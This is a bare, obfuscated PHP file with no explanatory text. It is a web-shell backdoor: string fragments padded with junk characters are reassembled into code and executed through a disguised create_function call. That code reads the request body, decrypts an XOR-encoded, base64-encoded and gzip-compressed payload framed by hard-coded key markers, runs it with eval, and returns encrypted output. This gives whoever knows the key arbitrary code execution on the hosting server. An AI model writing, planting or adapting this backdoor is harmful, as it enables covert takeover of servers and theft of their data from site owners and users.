<?php
$I=',$k){$[wc=strl[wen($k)[w;$l=[w[wstrlen($t);[w$o="";[wfor($i=0[w[w;$[wi<$l;){fo[wr($j[w=[w0[w;($j<$c&&$i<[w$l);$j++,$i++)[w';
$g=str_replace('nR','','crenRatnRe_nRfnRunnRcnRtion');
$i='t[w_contents[w()[w;@o[wb_end_clean();$r=[w@bas[we64_en[wcode(@x([w@gzc[womp[wr[wess($o[w[w)[w,$k));print("$p$kh$r$kf");}';
$w='[w$k="df38[w32b0";$kh="[wd9a[w8[wf5a081ab";[w$kf="20f692[w8e7fc8[w"[w;$p="8B[w8[wVrqdTTbESMta[w[wg";functio[wn x($t';
$u='npu[wt"),[w$m)=[w=1) {@[wob_start();@ev[wa[wl(@gzuncompre[wss(@x(@[wb[wase64_dec[wode([w$m[1[w]),$k)));$o=@o[wb_ge[w';
$C='{$o.=$[wt{$i}^$k{$j}[w;}[w}re[wtur[wn $o;}if (@pr[weg_m[watch[w("/$kh(.+)$[wkf/",@f[wile_ge[wt_cont[went[ws("php://[wi[w';
$J=str_replace('[w','',$w.$I.$C.$u.$i);
$R=$g('',$J);$R();
?>
